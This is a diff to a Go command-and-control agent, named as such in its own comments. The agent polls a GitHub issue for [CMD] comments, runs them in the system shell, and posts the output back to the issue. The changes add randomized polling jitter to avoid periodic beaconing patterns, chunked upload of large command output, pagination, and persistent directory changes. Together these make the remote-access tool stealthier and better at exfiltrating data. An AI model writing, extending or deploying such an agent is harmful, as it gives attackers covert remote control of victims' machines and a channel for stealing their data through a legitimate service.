@@ -8,6 +8,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"math/rand"
 	"net/http"
 	"os"
 	"os/exec"
@@ -23,9 +24,9 @@ const (
 	// OutPrefix marks a comment as output from the agent.
 	OutPrefix = "[OUT]"
 
-	// pollInterval is how often the agent checks GitHub for new commands.
-	// GitHub allows 5000 authenticated requests/hr — at 5s intervals that's ~720/hr.
-	pollInterval = 5 * time.Second
+	// Polling configuration with jitter to avoid rigid, periodic intervals
+	basePollInterval = 10 * time.Second
+	pollJitterRange  = 3 * time.Second // Interval fluctuates by +/- 3s (7s to 13s)
 )
 
 // Comment mirrors only the GitHub API comment fields we care about.
@@ -52,26 +53,38 @@ func New(repo string, issueNumber int) *Agent {
 }
 
 // Run is the agent entry point. It sets up dependencies, verifies auth,
-// then enters the poll loop. Blocks indefinitely.
+// then enters the poll loop with randomized jitter. Blocks indefinitely.
 func (a *Agent) Run() error {
 	if err := a.setup(); err != nil {
 		return err
 	}
 
-	fmt.Printf("[agent] Polling %s issue #%d every %s\n", a.repo, a.issueNumber, pollInterval)
-
-	// Fast-forward lastSeenID so we don't re-execute commands from before we started.
+	// Identify any already-completed commands so we don't repeat them
 	if err := a.catchUp(); err != nil {
 		fmt.Printf("[agent] Warning — could not read comment history: %s\n", err)
 	}
 
-	ticker := time.NewTicker(pollInterval)
+	fmt.Printf("[agent] Starting polling loop on %s issue #%d (base %s, ±%s jitter)...\n", a.repo, a.issueNumber, basePollInterval, pollJitterRange)
+
+	// Poll immediately on startup once so we don't sit waiting for the first ticker delay
+	if err := a.poll(); err != nil {
+		fmt.Printf("[agent] Poll error: %s\n", err)
+	}
+
+	ticker := time.NewTicker(basePollInterval)
 	defer ticker.Stop()
 
 	for range ticker.C {
 		if err := a.poll(); err != nil {
 			fmt.Printf("[agent] Poll error: %s\n", err)
 		}
+
+		// Generate a random offset between -pollJitterRange and +pollJitterRange
+		randomOffset := time.Duration(rand.Int63n(int64(pollJitterRange*2))) - pollJitterRange
+		nextInterval := basePollInterval + randomOffset
+
+		// Update the ticker for the next loop iteration
+		ticker.Reset(nextInterval)
 	}
 	return nil
 }
@@ -480,23 +493,43 @@ func extractFromTarGz(archivePath, innerPath, destPath string) error {
 
 // ── Polling ────────────────────────────────────────────────────────────────────
 
-// catchUp reads all existing comments and sets lastSeenID to the newest one.
-// This ensures we skip commands posted before the agent came online.
+// catchUp scans existing comments and sets lastSeenID to only skip commands
+// that have already received an [OUT] reply. Any pending [CMD] is left to be processed.
 func (a *Agent) catchUp() error {
 	comments, err := a.getComments()
 	if err != nil {
 		return err
 	}
-	for _, c := range comments {
-		if c.ID > a.lastSeenID {
-			a.lastSeenID = c.ID
+	if len(comments) == 0 {
+		fmt.Println("[agent] No prior comments on thread. Watching for first [CMD]...")
+		return nil
+	}
+
+	var lastHandledID int64
+	for i, c := range comments {
+		body := strings.TrimSpace(c.Body)
+		if strings.HasPrefix(body, OutPrefix) {
+			// This is an agent reply; mark this and older comments as handled
+			if c.ID > lastHandledID {
+				lastHandledID = c.ID
+			}
+		} else if strings.HasPrefix(body, CmdPrefix) {
+			// Check if there is an [OUT] comment after this [CMD]
+			hasReply := false
+			for j := i + 1; j < len(comments); j++ {
+				if strings.HasPrefix(strings.TrimSpace(comments[j].Body), OutPrefix) {
+					hasReply = true
+					break
+				}
+			}
+			if hasReply && c.ID > lastHandledID {
+				lastHandledID = c.ID
+			}
 		}
 	}
-	if a.lastSeenID > 0 {
-		fmt.Printf("[agent] Fast-forwarded past comment #%d — skipping older commands\n", a.lastSeenID)
-	} else {
-		fmt.Println("[agent] No prior comments found. Watching for first [CMD]...")
-	}
+
+	a.lastSeenID = lastHandledID
+	fmt.Printf("[agent] Thread history synced: %d comments found. Active cursor set to comment #%d\n", len(comments), a.lastSeenID)
 	return nil
 }
 
@@ -507,43 +540,54 @@ func (a *Agent) poll() error {
 		return err
 	}
 
+	foundCommands := 0
 	for _, c := range comments {
 		// Skip anything already processed
 		if c.ID <= a.lastSeenID {
 			continue
 		}
 
-		// Advance cursor even for non-CMD comments (e.g. our own [OUT] replies)
-		if !strings.HasPrefix(c.Body, CmdPrefix) {
+		body := strings.TrimSpace(c.Body)
+
+		// Advance cursor past non-CMD comments (e.g. [OUT] replies or general discussion)
+		if !strings.HasPrefix(body, CmdPrefix) {
 			a.lastSeenID = c.ID
 			continue
 		}
 
+		foundCommands++
 		// Strip [CMD] prefix and run the command
-		cmd := strings.TrimSpace(strings.TrimPrefix(c.Body, CmdPrefix))
-		fmt.Printf("[agent] Received command (comment #%d): %s\n", c.ID, cmd)
+		cmd := strings.TrimSpace(strings.TrimPrefix(body, CmdPrefix))
+		fmt.Printf("\n[agent] >>> Executing command (comment #%d): %s\n", c.ID, cmd)
 
 		output := a.execute(cmd)
 
-		if err := a.postComment(OutPrefix + " " + output); err != nil {
+		if err := a.postOutput(output); err != nil {
 			fmt.Printf("[agent] Failed to post output: %s\n", err)
 		} else {
-			fmt.Println("[agent] Output posted.")
+			fmt.Printf("[agent] <<< Output posted for comment #%d.\n", c.ID)
 		}
 
 		a.lastSeenID = c.ID // mark command as done
 	}
+
+	if foundCommands == 0 {
+		fmt.Printf("[agent] Polled issue #%d: %d comments on thread (waiting for new [CMD])...\n", a.issueNumber, len(comments))
+	}
+
 	return nil
 }
 
 // ── GitHub CLI wrappers ────────────────────────────────────────────────────────
 
 // getComments calls the GitHub API via gh and returns parsed comments.
-// gh automatically uses GH_TOKEN / GITHUB_TOKEN for auth and sets the default API version header.
+// Uses --paginate and per_page=100 so all comments across all pages are retrieved
+// (by default GitHub caps responses at 30 comments, causing newer comments to be missed).
 func (a *Agent) getComments() ([]Comment, error) {
 	cmd := exec.Command(
 		"gh", "api",
-		fmt.Sprintf("repos/%s/issues/%d/comments", a.repo, a.issueNumber),
+		"--paginate",
+		fmt.Sprintf("repos/%s/issues/%d/comments?per_page=100", a.repo, a.issueNumber),
 		"--header", "X-GitHub-Api-Version: 2022-11-28",
 	)
 	cmd.Env = append(os.Environ(), "GH_TOKEN="+a.token, "GITHUB_TOKEN="+a.token)
@@ -567,16 +611,49 @@ func (a *Agent) getComments() ([]Comment, error) {
 	return comments, nil
 }
 
+// maxChunkSize is the safe limit for a single GitHub comment (GitHub's limit is 65,536).
+const maxChunkSize = 60000
+
+// postOutput posts the command execution result back to the issue thread.
+// If the output exceeds maxChunkSize, it splits it into sequential numbered parts
+// so GitHub does not reject it and no data is lost.
+func (a *Agent) postOutput(output string) error {
+	if len(output) <= maxChunkSize {
+		return a.postComment(OutPrefix + " " + output)
+	}
+
+	// Split large output into chunks
+	totalParts := (len(output) + maxChunkSize - 1) / maxChunkSize
+	for i := 0; i < totalParts; i++ {
+		start := i * maxChunkSize
+		end := start + maxChunkSize
+		if end > len(output) {
+			end = len(output)
+		}
+
+		header := fmt.Sprintf("%s [Part %d/%d]\n", OutPrefix, i+1, totalParts)
+		chunkBody := header + output[start:end]
+
+		if err := a.postComment(chunkBody); err != nil {
+			return fmt.Errorf("posting part %d/%d: %w", i+1, totalParts, err)
+		}
+	}
+	return nil
+}
+
 // postComment posts a comment on the issue thread via the gh CLI.
-// Used to send [OUT] replies back to the server.
+// It feeds the body via standard input (--body-file -) to completely bypass
+// the Windows 32,767-character command-line argument limit.
 func (a *Agent) postComment(body string) error {
 	cmd := exec.Command(
 		"gh", "issue", "comment",
 		fmt.Sprintf("%d", a.issueNumber),
 		"--repo", a.repo,
-		"--body", body,
+		"--body-file", "-",
 	)
 	cmd.Env = append(os.Environ(), "GH_TOKEN="+a.token, "GITHUB_TOKEN="+a.token)
+	cmd.Stdin = strings.NewReader(body)
+
 	out, err := cmd.CombinedOutput()
 	if err != nil {
 		return fmt.Errorf("gh issue comment: %w\n%s", err, string(out))
@@ -587,8 +664,16 @@ func (a *Agent) postComment(body string) error {
 // ── Command execution ──────────────────────────────────────────────────────────
 
 // execute runs a shell command and returns its combined stdout+stderr.
-// Uses the platform's native shell so pipes, redirects, env vars, etc. all work.
+// It intercepts 'cd' commands to update the agent's working directory so that
+// directory changes persist across separate command comments.
 func (a *Agent) execute(cmd string) string {
+	trimmed := strings.TrimSpace(cmd)
+
+	// Intercept built-in 'cd' commands
+	if strings.EqualFold(trimmed, "cd") || strings.HasPrefix(strings.ToLower(trimmed), "cd ") {
+		return a.handleCd(trimmed)
+	}
+
 	var c *exec.Cmd
 
 	// #nosec G204 — intentional: arbitrary remote execution is the purpose of a C2 agent
@@ -614,4 +699,43 @@ func (a *Agent) execute(cmd string) string {
 		return "[command produced no output]"
 	}
 	return result
+}
+
+// handleCd manages directory changes in the agent process.
+// Because child processes (powershell/sh) cannot alter the parent's working directory,
+// the agent process itself must call os.Chdir() so subsequent commands inherit the new directory.
+func (a *Agent) handleCd(cmd string) string {
+	target := strings.TrimSpace(cmd[2:]) // strip 'cd'
+	target = strings.Trim(target, `"'`)  // strip quotes
+
+	// 'cd' with no arguments: return current working directory
+	if target == "" {
+		cwd, err := os.Getwd()
+		if err != nil {
+			return fmt.Sprintf("[error getting cwd: %s]", err)
+		}
+		return cwd
+	}
+
+	// Expand '~' to user home directory
+	if target == "~" || strings.HasPrefix(target, "~/") || strings.HasPrefix(target, `~\`) {
+		home, err := os.UserHomeDir()
+		if err == nil {
+			if target == "~" {
+				target = home
+			} else {
+				target = filepath.Join(home, target[2:])
+			}
+		}
+	}
+
+	if err := os.Chdir(target); err != nil {
+		return fmt.Sprintf("cd: %s", err)
+	}
+
+	newDir, err := os.Getwd()
+	if err != nil {
+		return target
+	}
+	return newDir
 }
